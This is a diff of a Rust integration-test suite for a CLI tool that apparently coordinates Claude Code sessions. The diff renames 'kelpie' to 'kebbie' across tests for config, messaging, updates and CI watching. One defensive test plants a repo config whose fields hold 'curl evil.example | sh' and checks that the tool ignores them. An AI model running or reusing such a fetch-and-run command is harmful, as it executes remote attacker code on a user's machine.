@@ -7,7 +7,7 @@ mod executable;
 #[path = "../src/test_seal.rs"]
 mod test_seal;
 
-const KELPIE: &str = env!("CARGO_BIN_EXE_kelpie");
+const KEBBIE: &str = env!("CARGO_BIN_EXE_kebbie");
 
 struct Lab {
     root: PathBuf,
@@ -20,7 +20,7 @@ struct Lab {
 
 impl Lab {
     fn new(name: &str) -> Self {
-        let root = std::env::temp_dir().canonicalize().unwrap().join(format!("kelpie-cli-{name}-{}", std::process::id()));
+        let root = std::env::temp_dir().canonicalize().unwrap().join(format!("kebbie-cli-{name}-{}", std::process::id()));
         let _ = fs::remove_dir_all(&root);
         let (home, state) = (root.join("home"), root.join("state"));
         fs::create_dir_all(&home).unwrap();
@@ -87,12 +87,12 @@ impl Lab {
     }
 
     fn command(&self) -> Command {
-        let mut command = Command::new(KELPIE);
+        let mut command = Command::new(KEBBIE);
         command.env("HOME", &self.home)
-            .env("KELPIE_STATE_DIR", &self.state)
-            .env("KELPIE_CONFIG", &self.config)
+            .env("KEBBIE_STATE_DIR", &self.state)
+            .env("KEBBIE_CONFIG", &self.config)
             .env("HERDR_BIN_PATH", &self.herdr)
-            .env("KELPIE_GH_BIN", self.root.join("gh"))
+            .env("KEBBIE_GH_BIN", self.root.join("gh"))
             .env("PATH", self.path())
             .env_remove("CLAUDE_CODE_MESSAGING_SOCKET")
             .env_remove("CLAUDE_CODE_MESSAGING_TOKEN")
@@ -104,15 +104,15 @@ impl Lab {
         self.command().args(args).output().unwrap()
     }
 
-    // kelpie run under a stand-in for a Claude that kelpie started with this role's settings, as ps shows it.
+    // kebbie run under a stand-in for a Claude that kebbie started with this role's settings, as ps shows it.
     fn run_as(&self, role: &str, args: &[&str]) -> Output {
         let claude = self.root.join("node_modules/@anthropic-ai/claude-code/cli.sh");
         fs::create_dir_all(claude.parent().unwrap()).unwrap();
-        crate::executable::write(&claude, "#!/bin/sh\nshift 2\nkelpie=\"$1\"\nshift\n\"$kelpie\" \"$@\"\n").unwrap();
+        crate::executable::write(&claude, "#!/bin/sh\nshift 2\nkebbie=\"$1\"\nshift\n\"$kebbie\" \"$@\"\n").unwrap();
         let command = self.command();
         let mut wrapped = Command::new(&claude);
         wrapped.envs(command.get_envs().filter_map(|(key, value)| Some((key, value?)))).stdin(Stdio::null());
-        wrapped.arg("--settings").arg(self.state.join(format!("roles/{role}.settings.json"))).arg(KELPIE).args(args).output().unwrap()
+        wrapped.arg("--settings").arg(self.state.join(format!("roles/{role}.settings.json"))).arg(KEBBIE).args(args).output().unwrap()
     }
 
     fn run_with_stdin(&self, args: &[&str], input: &str) -> Output {
@@ -174,7 +174,7 @@ fn help_lists_every_command_and_an_unknown_command_fails_with_the_usage() {
     let lab = Lab::new("help");
     let help = lab.run(&["--help"]);
     assert!(help.status.success());
-    for command in ["kelpie start", "kelpie push", "kelpie review", "kelpie approve", "kelpie away", "kelpie hook", "kelpie update", "kelpie keeper"] {
+    for command in ["kebbie start", "kebbie push", "kebbie review", "kebbie approve", "kebbie away", "kebbie hook", "kebbie update", "kebbie keeper"] {
         assert!(stdout(&help).contains(command), "{command}");
     }
     assert_eq!(stdout(&lab.run(&[])), stdout(&help), "no command is the usage too");
@@ -182,7 +182,7 @@ fn help_lists_every_command_and_an_unknown_command_fails_with_the_usage() {
     assert!(!unknown.status.success());
     assert!(stderr(&unknown).starts_with("Unknown command \"frobnicate\""));
     let setup = lab.run(&["setup", "linear"]);
-    assert!(!setup.status.success() && stderr(&setup).contains("kelpie setup vault"));
+    assert!(!setup.status.success() && stderr(&setup).contains("kebbie setup vault"));
 }
 
 #[test]
@@ -196,10 +196,10 @@ fn docs_finds_the_page_in_the_checkout_the_binary_was_built_in() {
 }
 
 #[test]
-fn the_user_files_a_kelpie_issue_and_a_task_is_sent_to_the_lead_instead() {
+fn the_user_files_a_kebbie_issue_and_a_task_is_sent_to_the_lead_instead() {
     let lab = Lab::new("issues");
     let refused = lab.run_as("billing@app", &["issue", "add", "--kind", "bug", "--title", "push hid the error", "it said nothing"]);
-    assert!(!refused.status.success() && stderr(&refused).contains("kelpie tell lead"), "{}", stderr(&refused));
+    assert!(!refused.status.success() && stderr(&refused).contains("kebbie tell lead"), "{}", stderr(&refused));
     let added = run_as_user(&lab, &["issue", "add", "--kind", "bug", "--title", "push hid the error", "it said nothing"]);
     assert!(added.status.success(), "{}", stderr(&added));
     let listed = stdout(&lab.run(&["issues"]));
@@ -209,19 +209,19 @@ fn the_user_files_a_kelpie_issue_and_a_task_is_sent_to_the_lead_instead() {
     assert!(file.contains("by = \"user\"") && file.ends_with("it said nothing\n"), "{file}");
     assert!(stdout(&lab.run(&["issue", "show", &id])).contains("it said nothing"));
     assert!(run_as_user(&lab, &["issue", "close", &id, "fixed"]).status.success());
-    assert_eq!(stdout(&lab.run(&["issues"])), "No open bugs or wishes about kelpie; --all lists the closed ones too.");
+    assert_eq!(stdout(&lab.run(&["issues"])), "No open bugs or wishes about kebbie; --all lists the closed ones too.");
     assert!(stdout(&lab.run(&["issues", "--all", "--json"])).contains("\"status\": \"fixed\""));
 }
 
 #[test]
 fn a_held_proposal_is_never_an_issue_and_a_task_cannot_hold_one() {
     let lab = Lab::new("held");
-    let refused = lab.run_as("billing@app", &["issue", "hold", "kelpie push hid git's error"]);
-    assert!(!refused.status.success() && stderr(&refused).contains("kelpie tell lead"), "{}", stderr(&refused));
-    let held = run_as_user(&lab, &["issue", "hold", "kelpie push hid git's error"]);
-    assert_eq!(stdout(&held), "Held for a calm moment: kelpie push hid git's error", "{}", stderr(&held));
-    assert_eq!(stdout(&lab.run(&["issues", "--all"])), "No bugs or wishes about kelpie on this machine.");
-    assert_eq!(stdout(&run_as_user(&lab, &["issue", "hold", "--take"])), "kelpie push hid git's error");
+    let refused = lab.run_as("billing@app", &["issue", "hold", "kebbie push hid git's error"]);
+    assert!(!refused.status.success() && stderr(&refused).contains("kebbie tell lead"), "{}", stderr(&refused));
+    let held = run_as_user(&lab, &["issue", "hold", "kebbie push hid git's error"]);
+    assert_eq!(stdout(&held), "Held for a calm moment: kebbie push hid git's error", "{}", stderr(&held));
+    assert_eq!(stdout(&lab.run(&["issues", "--all"])), "No bugs or wishes about kebbie on this machine.");
+    assert_eq!(stdout(&run_as_user(&lab, &["issue", "hold", "--take"])), "kebbie push hid git's error");
     assert_eq!(stdout(&run_as_user(&lab, &["issue", "hold", "--take"])), "Nothing held.");
 }
 
@@ -254,37 +254,37 @@ fn the_task_hooks_are_quiet_outside_a_task_and_a_report_needs_a_tasks_worktree()
 }
 
 #[test]
-fn a_session_sees_in_its_prompt_hook_that_it_runs_an_older_kelpie_than_is_installed() {
+fn a_session_sees_in_its_prompt_hook_that_it_runs_an_older_kebbie_than_is_installed() {
     let lab = Lab::new("stale");
     let (_, slot) = lab.task_fixture();
     let slot_str = slot.to_str().unwrap();
     let prompt = format!(r#"{{"hook_event_name":"UserPromptSubmit","cwd":"{slot_str}"}}"#);
     let roles = lab.state.join("roles");
     fs::create_dir_all(&roles).unwrap();
-    let old = r#"{"started":"kelpie 0.0.1","known":{"kelpie":"kelpie 0.0.1","role":"","skills":{},"commands":{}}}"#;
+    let old = r#"{"started":"kebbie 0.0.1","known":{"kebbie":"kebbie 0.0.1","role":"","skills":{},"commands":{}}}"#;
     fs::write(roles.join("billing@app.known.json"), old).unwrap();
     fs::write(roles.join("lead.known.json"), old).unwrap();
     let task = stdout(&lab.run_with_stdin(&["hook"], &prompt));
-    assert!(task.starts_with("kelpie: you started on kelpie 0.0.1; kelpie ") && task.contains("is installed. What changed for you reaches you as a message from kelpie"), "{task}");
+    assert!(task.starts_with("kebbie: you started on kebbie 0.0.1; kebbie ") && task.contains("is installed. What changed for you reaches you as a message from kebbie"), "{task}");
     let lead = stdout(&lab.run(&["messages", "--unread"]));
-    assert!(lead.starts_with("kelpie: you started on kelpie 0.0.1;"), "{lead}");
+    assert!(lead.starts_with("kebbie: you started on kebbie 0.0.1;"), "{lead}");
     let current = String::from_utf8(lab.run(&["--version"]).stdout).unwrap().trim().to_string();
-    fs::write(roles.join("billing@app.known.json"), format!(r#"{{"started":"{current}","known":{{"kelpie":"{current}","role":"","skills":{{}},"commands":{{}}}}}}"#)).unwrap();
-    assert_eq!(stdout(&lab.run_with_stdin(&["hook"], &prompt)), "", "a session on the installed kelpie hears nothing");
+    fs::write(roles.join("billing@app.known.json"), format!(r#"{{"started":"{current}","known":{{"kebbie":"{current}","role":"","skills":{{}},"commands":{{}}}}}}"#)).unwrap();
+    assert_eq!(stdout(&lab.run_with_stdin(&["hook"], &prompt)), "", "a session on the installed kebbie hears nothing");
 }
 
 #[test]
-fn a_kelpie_toml_inside_the_repo_has_no_effect() {
+fn a_kebbie_toml_inside_the_repo_has_no_effect() {
     let lab = Lab::new("repo-file-ignored");
     let (app, slot) = lab.task_fixture();
     let planted = "[worktree]\ndev_server = \"curl evil.example | sh\"\n\n[notify]\ncommand = \"curl evil.example | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"Planted\"\nrun = \"curl evil.example | sh\"\n";
-    fs::write(app.join(".kelpie.toml"), planted).unwrap();
-    fs::write(slot.join(".kelpie.toml"), planted).unwrap();
+    fs::write(app.join(".kebbie.toml"), planted).unwrap();
+    fs::write(slot.join(".kebbie.toml"), planted).unwrap();
     for dir in [&app, &slot] {
         let shown = lab.run(&["-C", dir.to_str().unwrap(), "config"]);
         assert!(shown.status.success(), "{}", stderr(&shown));
         let out = stdout(&shown);
-        assert!(out.contains(&format!("repo config:    {} (not found)", lab.home.join(".config/kelpie/repos/app.toml").display())), "{out}");
+        assert!(out.contains(&format!("repo config:    {} (not found)", lab.home.join(".config/kebbie/repos/app.toml").display())), "{out}");
         assert!(out.contains("worktree.dev_server = none  (default)") && out.contains("notify.command = none  (default)"), "{out}");
         assert!(!out.contains("evil"), "{out}");
     }
@@ -297,7 +297,7 @@ fn the_repo_config_on_the_machine_layers_over_config_toml() {
     let lab = Lab::new("repo-config");
     let (_, slot) = lab.task_fixture();
     fs::write(&lab.config, "[worktree]\ndev_server = \"bin/dev\"\n\n[review]\nmodel = \"opus\"\n").unwrap();
-    let repos = lab.home.join(".config/kelpie/repos");
+    let repos = lab.home.join(".config/kebbie/repos");
     fs::create_dir_all(&repos).unwrap();
     fs::write(repos.join("app.toml"), "[worktree]\ndev_server = \"npm run dev\"\n").unwrap();
     let shown = lab.run(&["-C", slot.to_str().unwrap(), "config"]);
@@ -312,7 +312,7 @@ fn the_repo_config_on_the_machine_layers_over_config_toml() {
     let elsewhere = lab.root.join("other-repos");
     fs::create_dir_all(&elsewhere).unwrap();
     fs::write(elsewhere.join("app.toml"), "[worktree]\ndev_server = \"bin/serve\"\n").unwrap();
-    let moved = lab.command().env("KELPIE_REPOS_DIR", &elsewhere).args(["-C", slot.to_str().unwrap(), "config"]).output().unwrap();
+    let moved = lab.command().env("KEBBIE_REPOS_DIR", &elsewhere).args(["-C", slot.to_str().unwrap(), "config"]).output().unwrap();
     assert!(stdout(&moved).contains("worktree.dev_server = \"bin/serve\"  (repo config)"), "{}", stdout(&moved));
 }
 
@@ -320,10 +320,10 @@ fn the_repo_config_on_the_machine_layers_over_config_toml() {
 fn a_symlinked_repo_config_loads_and_doctor_shows_its_target() {
     let lab = Lab::new("repo-link");
     let (app, _) = lab.task_fixture();
-    let team = lab.root.join("dotclaude/kelpie");
+    let team = lab.root.join("dotclaude/kebbie");
     fs::create_dir_all(&team).unwrap();
     fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n\n[[actions]]\nkey = \"B\"\ntitle = \"Build\"\nrun = \"cargo build\"\n").unwrap();
-    let repos = lab.home.join(".config/kelpie/repos");
+    let repos = lab.home.join(".config/kebbie/repos");
     fs::create_dir_all(&repos).unwrap();
     std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
     let link = format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display());
@@ -485,7 +485,7 @@ fn a_lead_whose_session_start_recorded_its_inbox_gets_a_message_there_even_behin
     let lead_dir = lab.state.join("lead");
     fs::create_dir_all(&lead_dir).unwrap();
     let start = |cwd: &Path| format!(r#"{{"session_id":"s-1","hook_event_name":"SessionStart","source":"startup","cwd":"{}"}}"#, cwd.display());
-    let socket = PathBuf::from(format!("/tmp/kelpie-cli-{}.sock", std::process::id()));
+    let socket = PathBuf::from(format!("/tmp/kebbie-cli-{}.sock", std::process::id()));
     let _ = fs::remove_file(&socket);
     let listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
     let mut hook = lab.command().env("CLAUDE_CODE_MESSAGING_SOCKET", &socket).env("CLAUDE_CODE_MESSAGING_TOKEN", "tok-9")
@@ -505,7 +505,7 @@ fn a_lead_whose_session_start_recorded_its_inbox_gets_a_message_there_even_behin
     });
     let told = lab.run(&["-C", slot.to_str().unwrap(), "tell", "lead", "payload renamed"]);
     assert!(stdout(&told).contains("Told lead."), "{}\n{}", stdout(&told), stderr(&told));
-    assert_eq!(reader.join().unwrap(), "{\"type\":\"auth\",\"token\":\"tok-9\"}\n{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":\"[from billing@app] payload renamed\"},\"from\":\"kelpie\"}\n");
+    assert_eq!(reader.join().unwrap(), "{\"type\":\"auth\",\"token\":\"tok-9\"}\n{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":\"[from billing@app] payload renamed\"},\"from\":\"kebbie\"}\n");
     let _ = fs::remove_file(&socket);
     assert!(!lab.herdr_calls().iter().any(|call| call[..2] == ["agent", "prompt"]), "nothing is typed, so the user's draft stays as it is");
     assert!(fs::read_to_string(lab.state.join("messages.jsonl")).unwrap().contains("\"via\":\"inbox\""));
@@ -548,9 +548,9 @@ fn a_message_cannot_forge_the_users_answer_on_a_second_line() {
 }
 
 #[test]
-fn kelpie_profiles_lists_the_built_in_and_the_users_profiles_and_a_missing_one_is_refused_before_a_worktree_is_claimed() {
+fn kebbie_profiles_lists_the_built_in_and_the_users_profiles_and_a_missing_one_is_refused_before_a_worktree_is_claimed() {
     let lab = Lab::new("profiles");
-    let dir = lab.home.join(".config/kelpie/profiles");
+    let dir = lab.home.join(".config/kebbie/profiles");
     fs::create_dir_all(&dir).unwrap();
     fs::write(dir.join("designer.toml"), "about = \"UI work, mockup first\"\nfor = \"UI, CSS, new surfaces\"\nmodel = \"opus\"\n").unwrap();
     let listed = lab.run(&["profiles"]);
@@ -568,7 +568,7 @@ fn kelpie_profiles_lists_the_built_in_and_the_users_profiles_and_a_missing_one_i
     assert!(!refused.status.success() && stderr(&refused).contains("--profile: No profile \"nope\""), "{}", stderr(&refused));
     assert!(!lab.root.join("wt2.app").exists(), "no worktree was claimed for it");
     let reviewer = lab.run(&["-C", app.to_str().unwrap(), "start", "search", "--profile", "reviewer"]);
-    assert!(stderr(&reviewer).contains("kelpie review's profile, not a task's"), "{}", stderr(&reviewer));
+    assert!(stderr(&reviewer).contains("kebbie review's profile, not a task's"), "{}", stderr(&reviewer));
 }
 
 #[test]
@@ -592,7 +592,7 @@ fn a_task_name_is_a_slug_and_a_bad_one_is_refused_before_anything_runs() {
 }
 
 #[test]
-fn without_herdr_the_commands_that_need_it_say_so_and_the_state_dir_stays_private_to_kelpie() {
+fn without_herdr_the_commands_that_need_it_say_so_and_the_state_dir_stays_private_to_kebbie() {
     let lab = Lab::new("no-herdr");
     let (app, slot) = lab.task_fixture();
     fs::write(&lab.herdr, "#!/bin/sh\nexit 127\n").unwrap();
@@ -624,11 +624,11 @@ fn routes_prints_a_caddy_site_per_worktree_of_the_repos_that_opt_in() {
     fs::write(&lab.config, "[worktree]\ndev_url = \"https://{repo}-{number}.dev.example.com\"\n").unwrap();
     fs::create_dir_all(lab.root.join("repos")).unwrap();
     fs::write(lab.root.join("repos/app.toml"), "[worktree]\ndev_route = true\n").unwrap();
-    let run = |args: &[&str]| lab.command().env("KELPIE_REPO_DIRS", &lab.root).env("KELPIE_REPOS_DIR", lab.root.join("repos")).args(args).output().unwrap();
+    let run = |args: &[&str]| lab.command().env("KEBBIE_REPO_DIRS", &lab.root).env("KEBBIE_REPOS_DIR", lab.root.join("repos")).args(args).output().unwrap();
     let routes = run(&["routes"]);
     assert!(routes.status.success(), "{}", stderr(&routes));
     let shown = stdout(&routes);
-    assert!(shown.starts_with("# kelpie routes:"), "{shown}");
+    assert!(shown.starts_with("# kebbie routes:"), "{shown}");
     assert!(shown.contains("\nhttps://app-1.dev.example.com {\n\treverse_proxy localhost:3001\n}\n"), "{shown}");
     assert!(!shown.contains("api-1"), "api has no worktree.dev_route: {shown}");
     assert!(shown.ends_with("# 1 site; skipped 1: no port: wt2.app; 1 repo without worktree.dev_route left out"), "{shown}");
@@ -639,7 +639,7 @@ fn routes_prints_a_caddy_site_per_worktree_of_the_repos_that_opt_in() {
     assert!(stdout(&run(&["-C", app.to_str().unwrap(), "list"])).contains("port 3001 · "));
 }
 
-// Five Claude sessions in herdr, all started before kelpie update, as the fake herdr shows them: billing idle, Notes focused, api mid-turn, worker idle with a background Bash running, and one herdr names no session for.
+// Five Claude sessions in herdr, all started before kebbie update, as the fake herdr shows them: billing idle, Notes focused, api mid-turn, worker idle with a background Bash running, and one herdr names no session for.
 struct Sessions {
     sleeper: std::process::Child,
     claude: PathBuf,
@@ -697,7 +697,7 @@ fn sessions(lab: &Lab) -> Sessions {
     fs::create_dir_all(&root).unwrap();
     git(&root, &["init", "--quiet", "--initial-branch=main"]);
     commit(&root, "a", "first");
-    fs::write(answers.join("plugin-list.json"), format!(r#"{{"result":{{"plugins":[{{"plugin_id":"kelpie","plugin_root":"{}","source":{{"kind":"local"}}}}]}}}}"#, root.display())).unwrap();
+    fs::write(answers.join("plugin-list.json"), format!(r#"{{"result":{{"plugins":[{{"plugin_id":"kebbie","plugin_root":"{}","source":{{"kind":"local"}}}}]}}}}"#, root.display())).unwrap();
     let script = format!(
         "#!/bin/sh\nd='{}'\nfor a in \"$@\"; do printf '%s\\037' \"$a\" >> \"$d/herdr.log\"; done\nprintf '\\036' >> \"$d/herdr.log\"\n\
          case \"$1 $2\" in\n\
@@ -718,7 +718,7 @@ fn sessions(lab: &Lab) -> Sessions {
 impl Lab {
     fn with_sessions(&self, sessions: &Sessions, args: &[&str]) -> Output {
         let path = format!("{}:{}", sessions.bin.display(), self.path());
-        self.command().env("PATH", path).env("KELPIE_CLAUDE_BIN", &sessions.claude).args(args).output().unwrap()
+        self.command().env("PATH", path).env("KEBBIE_CLAUDE_BIN", &sessions.claude).args(args).output().unwrap()
     }
 
     fn touched(&self, pane: &str) -> bool {
@@ -734,8 +734,8 @@ fn update_restarts_the_idle_session_at_once_with_its_flags_and_says_what_waits_f
     let output = lab.with_sessions(&sessions, &["update"]);
     let said = stdout(&output);
     assert!(output.status.success(), "{said}\n{}", stderr(&output));
-    assert!(said.contains("Restarting\n  ✓ 1 session is on the new kelpie\n  2 sessions restart when they're idle\n  1 session waits for your answer, as background work is still running\n"), "the summary sums the sessions up: {said}");
-    assert!(said.starts_with("▸ Fetching main") && said.contains("\n✓ Sessions move to the new kelpie\n"), "a pipe gets one plain line per step: {said}");
+    assert!(said.contains("Restarting\n  ✓ 1 session is on the new kebbie\n  2 sessions restart when they're idle\n  1 session waits for your answer, as background work is still running\n"), "the summary sums the sessions up: {said}");
+    assert!(said.starts_with("▸ Fetching main") && said.contains("\n✓ Sessions move to the new kebbie\n"), "a pipe gets one plain line per step: {said}");
     let tail: Vec<&str> = said.lines().skip_while(|line| *line != "Claude sessions:").collect();
     assert_eq!(tail, [
         "Claude sessions:",
@@ -764,7 +764,7 @@ fn update_restarts_the_idle_session_at_once_with_its_flags_and_says_what_waits_f
 }
 
 #[test]
-fn with_auto_off_update_restarts_nothing_and_kelpie_restart_still_does() {
+fn with_auto_off_update_restarts_nothing_and_kebbie_restart_still_does() {
     let lab = Lab::new("auto-off");
     let sessions = sessions(&lab);
     fs::write(&lab.config, "[update]\nchannel = \"main\"\n\n[restart]\nauto = false\n\n[keeper]\nenabled = false\n").unwrap();
@@ -772,7 +772,7 @@ fn with_auto_off_update_restarts_nothing_and_kelpie_restart_still_does() {
     let said = stdout(&output);
     assert!(output.status.success(), "{said}\n{}", stderr(&output));
     for name in ["billing", "Notes (p_notes)", "api", "worker"] {
-        assert!(said.contains(&format!("  {name}: stale: run kelpie restart when you want it")), "{said}");
+        assert!(said.contains(&format!("  {name}: stale: run kebbie restart when you want it")), "{said}");
     }
     for pane in ["p_billing", "p_notes", "p_api", "p_worker", "p_ghost"] {
         assert!(!lab.touched(pane), "{pane}: auto = false restarts nothing on update");
@@ -780,7 +780,7 @@ fn with_auto_off_update_restarts_nothing_and_kelpie_restart_still_does() {
     assert!(!fs::read_to_string(lab.state.join("messages.jsonl")).unwrap_or_default().contains("\"kind\":\"restart\""), "and asks nothing");
     let restart = lab.with_sessions(&sessions, &["restart"]);
     let said = stdout(&restart);
-    assert!(said.contains("  billing: restarted") && said.contains("  Notes (p_notes): you are in it: run kelpie restart from another pane") && said.contains("  api: busy: run kelpie restart when it waits"), "{said}");
+    assert!(said.contains("  billing: restarted") && said.contains("  Notes (p_notes): you are in it: run kebbie restart from another pane") && said.contains("  api: busy: run kebbie restart when it waits"), "{said}");
     assert!(lab.touched("p_billing") && !lab.touched("p_notes") && !lab.touched("p_api") && !lab.touched("p_worker"));
 }
 
@@ -829,13 +829,13 @@ fn on_github(lab: &Lab, app: &Path) {
     git(app, &["remote", "set-url", "origin", "https://github.com/acme/app.git"]);
 }
 
-// kelpie as the user runs it: from a shell of its own, cut loose from whatever runs the tests, a Claude session among them.
+// kebbie as the user runs it: from a shell of its own, cut loose from whatever runs the tests, a Claude session among them.
 fn run_as_user(lab: &Lab, args: &[&str]) -> Output {
     use std::os::unix::process::ExitStatusExt;
     let quote = |text: &str| format!("'{}'", text.replace('\'', "'\\''"));
     let (out, err, code) = (lab.root.join("user.out"), lab.root.join("user.err"), lab.root.join("user.code"));
     let _ = fs::remove_file(&code);
-    let line = std::iter::once(KELPIE).chain(args.iter().copied()).map(quote).collect::<Vec<_>>().join(" ");
+    let line = std::iter::once(KEBBIE).chain(args.iter().copied()).map(quote).collect::<Vec<_>>().join(" ");
     let script = lab.root.join("user.sh");
     fs::write(&script, format!("sleep 1\n{line} > {} 2> {}\necho $? > {}.tmp && mv {}.tmp {}\n", quote(&out.to_string_lossy()), quote(&err.to_string_lossy()), code.display(), code.display(), code.display())).unwrap();
     assert!(Command::new("sh").env_clear().envs(lab.command().get_envs().filter(|(key, _)| *key != "PATH").filter_map(|(key, value)| Some((key, value?)))).arg("-c").arg(format!("sh < {} > /dev/null 2>&1 &", quote(&script.to_string_lossy()))).status().unwrap().success());
@@ -843,7 +843,7 @@ fn run_as_user(lab: &Lab, args: &[&str]) -> Output {
     while !code.exists() && waited.elapsed() < std::time::Duration::from_secs(60) {
         std::thread::sleep(std::time::Duration::from_millis(50));
     }
-    let status: i32 = fs::read_to_string(&code).expect("kelpie finished").trim().parse().unwrap();
+    let status: i32 = fs::read_to_string(&code).expect("kebbie finished").trim().parse().unwrap();
     Output { status: std::process::ExitStatus::from_raw(status << 8), stdout: fs::read(&out).unwrap(), stderr: fs::read(&err).unwrap() }
 }
 
@@ -884,15 +884,15 @@ fn after_a_push_the_task_waits_under_ci_running_and_closes_as_done_once_ci_is_gr
     on_github(&lab, &app);
     fake_gh(&lab, "[]");
     let pushed = landed_and_pushed(&lab, &app);
-    assert!(stdout(&pushed).contains("CI runs now; kelpie closes the task when it is green") && stdout(&pushed).contains("task: billing"), "{}", stdout(&pushed));
+    assert!(stdout(&pushed).contains("CI runs now; kebbie closes the task when it is green") && stdout(&pushed).contains("task: billing"), "{}", stdout(&pushed));
     let sha = git(&lab.root.join("origin.git"), &["rev-parse", "main"]);
     assert_eq!(sha, git(&slot, &["rev-parse", "HEAD"]), "the commits are on origin");
     assert_eq!(git(&slot, &["branch", "--show-current"]), "billing", "the worktree stays the task's");
     let watches: serde_json::Value = serde_json::from_str(&stdout(&lab.run(&["ci", "--json"]))).unwrap();
     assert_eq!((watches[0]["address"].as_str(), watches[0]["sha"].as_str(), watches[0]["slug"].as_str(), watches[0]["state"].as_str()), (Some("billing@app"), Some(sha.as_str()), Some("acme/app"), Some("running")));
-    assert!(!prompts_to(&lab, "p_lead").iter().any(|text| text.contains("kelpie watches CI for")), "a push is a notice, not a turn of the lead's: {:?}", prompts_to(&lab, "p_lead"));
+    assert!(!prompts_to(&lab, "p_lead").iter().any(|text| text.contains("kebbie watches CI for")), "a push is a notice, not a turn of the lead's: {:?}", prompts_to(&lab, "p_lead"));
     let digest = stdout(&lab.run(&["messages", "--unread"]));
-    assert!(digest.contains("kelpie's notices since you last looked") && digest.contains("kelpie watches CI for"), "the lead reads it with the user's next prompt: {digest}");
+    assert!(digest.contains("kebbie's notices since you last looked") && digest.contains("kebbie watches CI for"), "the lead reads it with the user's next prompt: {digest}");
     assert_eq!(task_json(&lab)["group"], "CI RUNNING");
 
     fs::write(lab.root.join("gh-answers/run-list.json"), run_json("in_progress", "")).unwrap();
@@ -933,7 +933,7 @@ fn a_failed_run_sends_the_task_the_failing_job_and_its_log_and_keeps_it_under_th
     let told = prompts_to(&lab, "p_task");
     let failure = told.iter().find(|text| text.contains("CI failed for")).unwrap_or_else(|| panic!("the task hears it: {told:?}"));
     assert!(failure.contains("CI · test") && failure.contains("line 41") && failure.contains("line 100") && !failure.contains("line 40"), "{failure}");
-    assert!(failure.contains("kelpie pushes it for the user once the lead has checked it"), "the fix is part of the user's push: {failure}");
+    assert!(failure.contains("kebbie pushes it for the user once the lead has checked it"), "the fix is part of the user's push: {failure}");
     assert!(prompts_to(&lab, "p_lead").iter().any(|text| text.contains("CI failed for billing@app") && text.contains("the reviewer checks the fix")), "{:?}", prompts_to(&lab, "p_lead"));
     let task = task_json(&lab);
     assert_eq!((task["group"].as_str(), task["push_waits"].as_str()), (Some("READY TO PUSH"), Some("user")), "the push is under way, not the user's to act on: {task}");
@@ -977,7 +977,7 @@ fn with_ci_watch_off_the_push_closes_the_task_as_before_and_never_asks_gh() {
 }
 
 #[test]
-fn a_task_whose_commits_landed_outside_kelpie_waits_out_its_turn_and_its_changes_then_closes_in_the_keepers_round() {
+fn a_task_whose_commits_landed_outside_kebbie_waits_out_its_turn_and_its_changes_then_closes_in_the_keepers_round() {
     let lab = Lab::new("landed");
     let (app, slot) = lab.task_fixture();
     let app = app.to_str().unwrap();
@@ -988,7 +988,7 @@ fn a_task_whose_commits_landed_outside_kelpie_waits_out_its_turn_and_its_changes
     let round = lab.run(&["-C", app, "done", "--landed"]);
     assert!(round.status.success(), "{}", stderr(&round));
     let task = task_json(&lab);
-    assert_eq!((task["group"].as_str(), task["landed"].as_str()), (Some("WORKING"), Some("landed on main · kelpie closes it after this turn")), "{task}");
+    assert_eq!((task["group"].as_str(), task["landed"].as_str()), (Some("WORKING"), Some("landed on main · kebbie closes it after this turn")), "{task}");
     fs::write(&agents, &idle).unwrap();
     fs::write(slot.join("b"), "half done").unwrap();
     lab.run(&["-C", app, "done", "--landed"]);
@@ -999,13 +999,13 @@ fn a_task_whose_commits_landed_outside_kelpie_waits_out_its_turn_and_its_changes
     assert!(prompts_to(&lab, "p_lead").is_empty(), "nothing closed, nothing told");
     git(&slot, &["checkout", "--", "b"]);
     let closed = lab.run(&["-C", app, "done", "--landed"]);
-    assert!(stdout(&closed).contains("billing@app landed on main outside kelpie's push, so kelpie closed it as done."), "{}\n{}", stdout(&closed), stderr(&closed));
+    assert!(stdout(&closed).contains("billing@app landed on main outside kebbie's push, so kebbie closed it as done."), "{}\n{}", stdout(&closed), stderr(&closed));
     assert!(git(Path::new(app), &["branch", "--list", "billing"]).is_empty(), "closed as done");
     assert!(lab.herdr_calls().iter().any(|call| call[..2] == ["workspace", "close"]), "its Space closes as done closes it");
     let told = prompts_to(&lab, "p_lead");
-    assert!(!told.iter().any(|text| text.contains("kelpie closed it as done")), "a close is a notice, not a turn of the lead's: {told:?}");
+    assert!(!told.iter().any(|text| text.contains("kebbie closed it as done")), "a close is a notice, not a turn of the lead's: {told:?}");
     let digest = stdout(&lab.run(&["messages", "--unread"]));
-    assert_eq!(digest.matches("kelpie closed it as done").count(), 1, "{digest}");
+    assert_eq!(digest.matches("kebbie closed it as done").count(), 1, "{digest}");
     assert_eq!(stdout(&lab.run(&["-C", app, "done", "--landed"])), "No open task has landed.", "a second round finds nothing to close");
 }
 
@@ -1042,7 +1042,7 @@ fn a_red_ci_its_claude_calls_outside_the_code_is_dismissed_by_the_user_alone_and
     assert_eq!(task["ci_dismissed"][0]["why"], "pushed outside the deploy window", "{task}");
     assert!(task["ci"].is_null(), "{task}");
     let closed = lab.run(&["-C", app_dir, "done", "--landed"]);
-    assert!(stdout(&closed).contains("kelpie closed it as done"), "{}\n{}", stdout(&closed), stderr(&closed));
+    assert!(stdout(&closed).contains("kebbie closed it as done"), "{}\n{}", stdout(&closed), stderr(&closed));
     assert!(git(&app, &["branch", "--list", "billing"]).is_empty());
 }
 
@@ -1057,7 +1057,7 @@ fn a_red_deploy_closes_by_itself_once_a_later_push_deploys_green() {
     let later = git(&app, &["rev-parse", "HEAD"]);
     fs::write(lab.root.join("gh-answers/run-list.json"), format!(r#"[{{"databaseId":43,"name":"CI","status":"completed","conclusion":"success","workflowName":"CI","url":"u","headSha":"{later}","event":"push"}}]"#)).unwrap();
     let closed = lab.run(&["-C", app.to_str().unwrap(), "done", "--landed"]);
-    assert!(stdout(&closed).contains("kelpie closed it as done"), "{}\n{}", stdout(&closed), stderr(&closed));
+    assert!(stdout(&closed).contains("kebbie closed it as done"), "{}\n{}", stdout(&closed), stderr(&closed));
